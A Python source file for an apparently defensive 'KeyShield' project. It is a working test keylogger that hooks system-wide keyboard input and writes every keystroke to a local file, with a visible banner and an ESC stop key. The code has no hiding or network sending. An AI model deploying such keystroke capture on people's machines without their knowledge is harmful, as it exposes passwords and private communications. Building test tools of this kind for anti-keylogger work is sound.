"""
KeyShield Project - Test Keylogger (Fixed)
-----------------------------------------
Fix: Prevents duplicate key logging using key state tracking.
"""

import os
import sys
import datetime

try:
    from pynput import keyboard
    USE_PYNPUT = True
except ImportError:
    USE_PYNPUT = False
    try:
        import keyboard as keyboard_fallback
    except ImportError:
        print("[KeyShield Logger] Missing dependency: install pynput or keyboard.")
        print("Run: pip install pynput keyboard")
        sys.exit(1)

# ── Config ──────────────────────────────────────────────────────────────────
LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylog_output.txt")
STOP_KEY = keyboard.Key.esc if USE_PYNPUT else "esc"

# Track pressed keys (fix for duplication)
pressed_keys = set()
# ────────────────────────────────────────────────────────────────────────────


def ensure_log_file_exists():
    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w", encoding="utf-8") as f:
            f.write("=== KeyShield keylog output ===\n")


def get_timestamp():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def write_log(text: str):
    ensure_log_file_exists()
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text)


def format_special_key(key):
    special_map = {
        "space": " ",
        "enter": "\n[ENTER]\n",
        "backspace": "[BKSP]",
        "tab": "[TAB]",
        "caps lock": "[CAPS]",
        "caps_lock": "[CAPS]",
        "shift": "[SHIFT]",
        "shift_r": "[SHIFT]",
        "ctrl": "[CTRL]",
        "ctrl_l": "[CTRL]",
        "ctrl_r": "[CTRL]",
        "alt": "[ALT]",
        "alt_l": "[ALT]",
        "alt_r": "[ALT]",
        "delete": "[DEL]",
        "esc": "[ESC]",
    }
    return special_map.get(key, f"[{key.upper()}]")


# ───────────────────── PYNPUT VERSION ─────────────────────
if USE_PYNPUT:

    def on_press(key):
        if key in pressed_keys:
            return  # Ignore repeated press

        pressed_keys.add(key)

        try:
            write_log(key.char)
        except AttributeError:
            label = format_special_key(key.name)
            write_log(label)

        if key == STOP_KEY:
            write_log(f"\n\n--- Logger stopped at {get_timestamp()} ---\n")
            print("\n[KeyShield Logger] ESC detected — stopping.")
            return False

    def on_release(key):
        if key in pressed_keys:
            pressed_keys.remove(key)

    def main():
        print("=" * 50)
        print("  KeyShield Test Keylogger (Fixed)")
        print("=" * 50)
        print(f"  Logging to : {LOG_FILE}")
        print(f"  Stop with  : ESC key or Ctrl+C")
        print("=" * 50)

        write_log(f"\n\n{'='*50}\n")
        write_log(f"Session started: {get_timestamp()}\n")
        write_log(f"{'='*50}\n")

        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            try:
                listener.join()
            except KeyboardInterrupt:
                write_log(f"\n\n--- Logger stopped (Ctrl+C) at {get_timestamp()} ---\n")
                print("\n[KeyShield Logger] Ctrl+C detected — stopping.")
                sys.exit(0)


# ───────────────────── KEYBOARD FALLBACK ─────────────────────
else:

    def on_press(event):
        name = event.name
        if name is None:
            return

        if name in pressed_keys:
            return  # Ignore repeated press

        pressed_keys.add(name)

        if len(name) == 1:
            write_log(name)
        else:
            write_log(format_special_key(name))

        if name == STOP_KEY:
            write_log(f"\n\n--- Logger stopped at {get_timestamp()} ---\n")
            print("\n[KeyShield Logger] ESC detected — stopping.")
            keyboard_fallback.unhook_all()

    def on_release(event):
        name = event.name
        if name in pressed_keys:
            pressed_keys.remove(name)

    def main():
        print("=" * 50)
        print("  KeyShield Test Keylogger (Fixed)")
        print("=" * 50)
        print(f"  Logging to : {LOG_FILE}")
        print(f"  Stop with  : ESC key or Ctrl+C")
        print("=" * 50)

        write_log(f"\n\n{'='*50}\n")
        write_log(f"Session started: {get_timestamp()}\n")
        write_log(f"{'='*50}\n")

        keyboard_fallback.hook(on_press)
        keyboard_fallback.on_release(on_release)

        try:
            keyboard_fallback.wait(STOP_KEY)
        except KeyboardInterrupt:
            write_log(f"\n\n--- Logger stopped (Ctrl+C) at {get_timestamp()} ---\n")
            print("\n[KeyShield Logger] Ctrl+C detected — stopping.")
        finally:
            keyboard_fallback.unhook_all()


# ───────────────────── ENTRY POINT ─────────────────────
if __name__ == "__main__":
    ensure_log_file_exists()
    main()